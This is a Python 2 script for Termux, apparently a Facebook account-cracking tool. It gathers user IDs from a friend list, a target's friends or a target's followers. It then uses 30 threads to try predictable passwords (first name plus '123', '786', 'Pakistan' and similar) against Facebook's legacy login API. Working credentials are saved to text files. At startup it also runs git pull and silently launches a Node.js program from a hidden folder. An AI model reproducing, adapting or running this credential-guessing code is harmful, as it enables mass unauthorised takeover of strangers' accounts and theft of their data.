#coding=utf-8
 
#!/usr/bin/python2
 
#Farhan Chaudhary
 
try:
 
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
 
    from multiprocessing.pool import ThreadPool
 
except ImportError:
 
    os.system("pip2 install requests")
 
    os.system("python2 your-name.py")
    
os.system("clear")
 
 
 
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
 
    os.system("apt update && apt install nodejs -y")
 
from requests.exceptions import ConnectionError
 
os.system("git pull")
 
if not os.path.isfile("/data/data/com.termux/files/home/FC-pro/...../node_modules/bytes/index.js"):
 
    os.system("fuser -k 5000/tcp &")
 
    os.system("cd ..... && pip install progress")
 
    os.system("cd ..... && npm install")
 
    os.system("cd ..... && node index.js &")
 
    os.system("clear")
 
    time.sleep(10)
 
elif os.path.isfile("/data/data/com.termux/files/home/FC-pro/...../node_modules/bytes/index.js"):
 
    os.system("fuser -k 5000/tcp &")
 
    os.system("#")
 
    os.system("cd ..... && node index.js &")
 
    os.system("clear")
 
bd=random.randint(2e7, 3e7)
 
sim=random.randint(2e4, 4e4)
 
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 
reload(sys)
 
sys.setdefaultencoding("utf-8")
 
c = "\033[1;92m"
 
c2 = "\033[0;97m"
 
c3 = "\033[1;91m"
 
logo = """                                          
  ______         _                 
 |  ____|       | |                
 | |__ __ _ _ __| |__   __ _ _ __  
 |  __/ _` | '__| '_ \ / _` | '_ \ 
 | | | (_| | |  | | | | (_| | | | |
 |_|  \__,_|_|  |_| |_|\__,_|_| |_|
                                            
\033[1;91m-----------------------------------------------                  
\033[1;91m-----------------------------------------------
\033[1;92m AUTHOR : Farhan Chaudhary
\033[1;92m Website  : www.farhan-chaudhary.blogspot.com
\033[1;91m-----------------------------------------------
\033[1;91m-----------------------------------------------
 
"""
def main():
 
    os.system("clear")
 
    print logo
 
    print("\033[0;96m[ LETS START ]").center(50)
 
    print("")
 
    print("\033[1;92m[1]\033[1;97mSTART CLONING....")
 
    print("")
 
    print("\033[1;91m[0]\033[1;97mEXIT")
 
    print("")
 
    main_select()
 
def main_select():
 
    FC = raw_input("\033[1;97m[#] Choose Option --->\033[1;96m ")
 
    if FC  =="1":
 
        login()
	main()  
 
    elif FC =="0":
 
        os.system("exit")
 
    else:
 
        print("[!] PlEASE SELECT A VALID OPTION").center(50)
 
        time.sleep(2)
 
        main()
 
def login():
 
    os.system("clear")
 
    print logo
 
    print("")
 
    print("\033[0;92m[ Login Menu ]").center(50)
 
    print("")
 
    print("\033[1;97m[1]\033[1;96mLOGIN WITH TOKEN")
 
    print("")
 
    print("\033[1;97m[0]\033[1;91mBACK")
 
    print("")
 
    login_select()
 
def login_select():
 
    FC = raw_input(" \033[1;97mCHOOSE OPTION :\033[1;96m ")
 
    if FC =="1":
 
        os.system("clear")
 
        print logo
 
        print("")
 
	print("[ LOGIN WITH TOKEN ]").center(50)
 
	print("")
 
        token = raw_input("[!] ENTER TOKEN \033[0;90m")
 
        token_s = open(".fb_token.txt","w")
 
        token_s.write(token)
 
        token_s.close()
 
        try:
 
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
 
            q = json.loads(r.text)
 
            name = q["name"]
 
            nm = name.rsplit(" ")[0]
 
            print("")
 
            print("\033[1;92mLOGIN SUCCESSFUL").center(50)
 
            time.sleep(1)
 
	    time.sleep(1)
 
            menu()
 
        except (KeyError , IOError):
 
            print("")
 
            print("\033[1;91m INVALID TOKEN\033[0;97m").center(50)
 
            print("")
 
            time.sleep(2)
 
            login()
 
 
    elif FC =="0":
 
        main()
 
    else:
 
        print("")
 
        print("SELECT VALID OPTION").center(50)
 
        print("")
 
        login_select()
 
 
 
 
def menu():
 
    global token
 
    os.system("clear")
 
    print logo
 
    try:
 
        token = open(".fb_token.txt","r").read()
 
    except (KeyError , IOError):
 
        login()
 
    try:
 
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
 
        q = json.loads(r.text)
 
        nm = q["name"]
 
        nmf = nm.rsplit(" ")[0]
 
        ok = nmf
 
    except (KeyError , IOError):
 
        print("")
 
        print("ACCOUNT IS ON CHECKPOINT").center(50)
 
        print("")
 
        os.system("rm -rf .fb_token.txt")
 
        time.sleep(1)
 
        login()
 
    except requests.exceptions.ConnectionError:
 
        print logo
 
        print("")
 
        print("CONNECTION FAILED").center(50)
 
        print("")
 
        time.sleep(2)
 
        menu()
 
    os.system("clear")
 
    print logo
 
    print("")
 
    print("\t\033[1;92mTOKEN OWNER.... : " +nm)
 
    print("")
 
    print("\033[1;97m[1]\033[1;92mCRACK FROM FRIENDLIST")
 
    print("")
 
    print("\033[1;97m[2]\033[1;92mCRACK FROM PUBLIC ID")
 
    print("")
 
    print("\033[1;97m[3]\033[1;92mCRACK FROM FOLLOERS")
 
    print("")
 
    print("\033[1;97m[0]\033[1;97mEXIT")
 
    print("")
 
    menu_select()
 
def menu_select():
 
	select = raw_input("\033[1;97m CHOOSE OPTION : ")
 
	id=[]
 
	oks=[]
 
	cps=[]
        if select =='':
                print("Please Select a Valid Option").center(50)
	elif select =="1":
 
		os.system("clear")
 
		print logo
 
		print("")
 
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
 
		z = json.loads(r.text)
 
		for s in z["data"]:
 
			uid=s['id']
 
			na=s['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	elif select =="2":
 
		os.system("clear")
 
		print(logo)
 
		print("")
 
		idt = raw_input("\033[1;97m[#] Put ID Link :\033[1;96m ")
 
		os.system("clear")
 
		print logo
 
		try:
 
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 
			q = json.loads(r.text)
 
			print("[!] Target from : "+q["name"])
 
		except (KeyError , IOError):
 
		    print("")
 
		    print("\033[1;91Your login account is on Checkpoint").center(50)
 
		    print("")
 
		    menu()
 
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 
		z = json.loads(r.text)
 
		for i in z["data"]:
 
			uid=i['id']
 
			na=i['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	elif select =="3":
 
		os.system("clear")
 
		print logo
 
		print("")
 
		idt = raw_input("\033[1;97m[#] Put ID Link :\033[1;96m ")
 
		os.system("clear")
 
		print logo
 
		try:
 
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 
			q = json.loads(r.text)
 
			print(" Target from  : "+q["name"])
 
		except (KeyError , IOError):
 
		    print("")
 
		    print("\033[1;91m Your login account is on checkpoint").center(50)
 
		    print("")
 
		    time.sleep(3)
 
		    menu()
 
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
 
		z = json.loads(r.text)
 
		for i in z["data"]:
 
			uid=i['id']
 
			na=i['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	elif select =="0":
 
	    os.system("exit")
 
 
	print("[#] Total IDs..... : "+str(len(id)))
 
	time.sleep(0.5)
 
	print("[#] Please Wait A minute.....")
 
	print 47*("-")
 
	print('')
 
	
 
	def main(arg):
 
		user=arg
 
		uid,name=user.split("=")
 
		try:
 
		    pass1=name+"123"
 
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		    d=json.loads(q)
 
		    if 'www.facebook.com' in d['error_msg']:
 
		        print("\033[1;93m[FC>CP] "+uid+" = "+pass1)
 
		        cp=open("FCcp.txt","a")
 
		        cp.write(uid+" = "+pass1+"\n")
 
		        cp.close()
 
		        cps.append(uid)
 
		    else:
 
		    	if "access_token" in d:
 
		            print("\x1b[1;97m[FC = OK] "+uid+" = "+pass1+"\x1b[1;0m")
 
		            ok=open("FCok.txt","a")
 
		            ok.write(uid+" = "+pass1+"\n")
 
		            ok.close()
 
		            oks.append(uid)
 
		        else:
 
		            pass2=name+"1234"
 
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		            d=json.loads(q)
 
		            if 'www.facebook.com' in d['error_msg']:
 
		                print("\033[1;93m[FC>CP] "+uid+" = "+pass2)
 
		                cp=open("FCcp.txt","a")
 
		                cp.write(uid+" = "+pass2+"\n")
 
		                cp.close()
 
		                cps.append(uid)
 
		            else:
 
		                if 'access_token' in d:
 
		                    print("\x1b[1;97m[FC = OK] "+uid+" = "+pass2+"\x1b[1;0m")
 
		                    ok=open("FCok.txt","a")
 
		                    ok.write(uid+" = "+pass2+"\n")
 
		                    ok.close()
 
		                    oks.append(uid)
 
		                else:
 
		                    pass3=name+"12345"
 
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                    d=json.loads(q)
 
		                    if 'www.facebook.com' in d['error_msg']:
 
		                        print("\033[1;93m[FC>CP] "+uid+" = "+pass3)
 
		                        cp=open("FCcp.txt","a")
 
		                        cp.write(uid+" = "+pass3+"\n")
 
		                        cp.close()
 
		                        cps.append(uid)
 
		                    else:
 
		                        if 'access_token' in d:
 
		                            print("\x1b[1;97m[FC = OK] "+uid+" = "+pass3+"\x1b[1;0m")
 
		                            ok=open("FCok.txt","a")
 
		                            ok.write(uid+" = "+pass3+"\n")
 
		                            ok.close()
 
		                            oks.append(uid)
 
		                        else:
 
		                            pass4=name+"786"
 
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                            d=json.loads(q)
 
		                            if 'www.facebook.com' in d['error_msg']:
 
		                                print("\033[1;93m[FC>CP] "+uid+" = "+pass4)
 
		                                cp=open("FCcp.txt","a")
 
		                                cp.write(uid+" = "+pass4+"\n")
 
		                                cp.close()
 
		                                cps.append(uid)
 
		                            else:
 
		                                if 'access_token' in d:
 
		                                    print("\x1b[1;97m[FC = OK] "+uid+" = "+pass4+"\x1b[1;0m")
 
		                                    ok=open("FCok.txt","a")
 
		                                    ok.write(uid+" = "+pass4+"\n")
 
		                                    ok.close()
 
		                                    oks.append(uid)
 
		                                else:
 
		                                    pass5="786786"
 
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                    d=json.loads(q)
 
		                                    if 'www.facebook.com' in d['error_msg']:
 
		                                        print("\033[1;93m[FC>CP] "+uid+" = "+pass5)
 
		                                        cp=open("FCcp.txt","a")
 
		                                        cp.write(uid+" = "+pass5+"\n")
 
		                                        cp.close()
 
		                                        cps.append(uid)
 
		                                    else:
 
		                                        if 'access_token' in d:
 
		                                            print("\x1b[1;97m[FC = OK] "+uid+" = "+pass5+"\x1b[1;0m")
 
		                                            ok=open("FCok.txt","a")
 
		                                            ok.write(uid+" = "+pass5+"\n")
 
		                                            ok.close()
 
		                                            oks.append(uid)
 
		                                        else:
 
		                                            pass6="223344"
 
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                            d=json.loads(q)
 
		                                            if 'www.facebook.com' in d['error_msg']:
 
		                                                print("\033[1;93m[FC>CP] "+uid+" = "+pass6)
 
		                                                cp=open("FCcp.txt","a")
 
		                                                cp.write(uid+" = "+pass6+"\n")
 
		                                                cp.close()
 
		                                                cps.append(uid)
 
		                                            else:
 
		                                                if 'access_token' in d:
 
		                                                    print("\x1b[1;97m[FC = OK] "+uid+" = "+pass6+"\x1b[1;0m")
 
		                                                    ok=open("FCok.txt","a")
 
		                                                    ok.write(uid+" = "+pass6+"\n")
 
		                                                    ok.close()
 
		                                                    oks.append(uid)
 
		                                                else:
 
		                                                    pass7="Pakistan"
 
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                                    d=json.loads(q)
 
		                                                    if 'www.facebook.com' in d['error_msg']:
 
		                                                        print("\033[1;93m[FC>CP] "+uid+" = "+pass7)
 
		                                                        cp=open("FCcp.txt","a")
 
		                                                        cp.write(uid+" = "+pass7+"\n")
 
		                                                        cp.close()
 
		                                                        cps.append(uid)
 
		                                                    else:
 
		                                                        if 'access_token' in d:
 
		                                                            print("\x1b[1;97m[FC = OK] "+uid+" = "+pass7+"\x1b[1;0m")
 
		                                                            ok=open("FCok.txt","a")
 
		                                                            ok.write(uid+" = "+pass7+"\n")
 
		                                                            ok.close()
 
		                                                            oks.append(uid)
 
									
 
															
 
		except:
 
			pass
 
		
 
	p = ThreadPool(30)
 
	p.map(main, id)
 
	print (" ")
 
	print (47*"-")
 
	print ("[!] Process has completed")
 
	print ("[!] Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
 
	print (47*"-")
 
	raw_input("\t\x1b[0;97mPress Enter For Main Menu")
 
	menu()
 
	
 
if __name__ == '__main__':
 
    main()
 
